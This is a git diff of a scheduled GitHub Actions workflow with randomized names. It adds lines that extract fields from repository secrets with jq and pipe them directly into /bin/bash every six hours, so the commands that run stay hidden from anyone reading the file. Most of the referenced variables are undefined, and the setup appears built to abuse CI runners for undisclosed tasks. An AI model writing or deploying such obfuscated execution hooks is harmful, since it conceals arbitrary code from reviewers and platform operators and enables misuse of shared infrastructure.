@@ -2,28 +2,19 @@ name: shuigeyue4183
 on:
   workflow_dispatch:
   schedule:
-    - cron: '19 4/6 * * *'
+    - cron: '50 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: shuigeyue4183
         env:
-          r15: ${{ secrets.r15 }}
+          knpk5: ${{ secrets.knpk5 }}
         run: |
-          echo $r15 | jq -r .cirw057 | /bin/bash
-          echo $ud8847 | jq -r .j2511 | /bin/bash
-          echo $bwte5 | jq -r .vfc41 | /bin/bash
-          echo $lqttq03590 | jq -r .kgkxm9 | /bin/bash
-          echo $czuf66532 | jq -r .jnhl964 | /bin/bash
-          echo $gtwga2 | jq -r .hh1459 | /bin/bash
-          echo $j835 | jq -r .sro733 | /bin/bash
-          echo $fd08219 | jq -r .a498 | /bin/bash
-          echo $pmcs34306 | jq -r .b39454 | /bin/bash
-          echo $knehq4 | jq -r .nv7 | /bin/bash
-          echo $zaxq80 | jq -r .nrm4 | /bin/bash
-          echo $ihku866 | jq -r .lij2 | /bin/bash
-          echo $dphm4 | jq -r .w1 | /bin/bash
+          echo $knpk5 | jq -r .fcz8 | /bin/bash
+          echo $h774 | jq -r .cjuqk1114 | /bin/bash
+          echo $drs7949 | jq -r .v5 | /bin/bash
+          echo $rjxt758 | jq -r .vd79420 | /bin/bash
 
